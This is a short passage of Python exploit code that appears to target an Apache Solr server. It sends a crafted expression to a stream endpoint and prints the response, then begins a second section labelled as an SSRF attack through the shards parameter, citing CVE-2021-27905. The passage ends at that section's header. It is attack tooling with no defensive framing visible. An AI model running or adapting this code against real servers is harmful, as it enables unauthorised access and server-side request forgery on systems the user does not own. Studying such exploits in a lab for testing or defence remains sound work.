try:
    url = f"{BASE}/demo/stream?expr={urllib.parse.quote(expr)}"
    req = urllib.request.urlopen(url, timeout=10)
    print(req.read().decode()[:500])
except Exception as e:
    print(f"Error: {e}")

# Attack 2: SSRF via shards parameter (CVE-2021-27905)
print("\n=== Attack 2: SSRF via shards param ===")
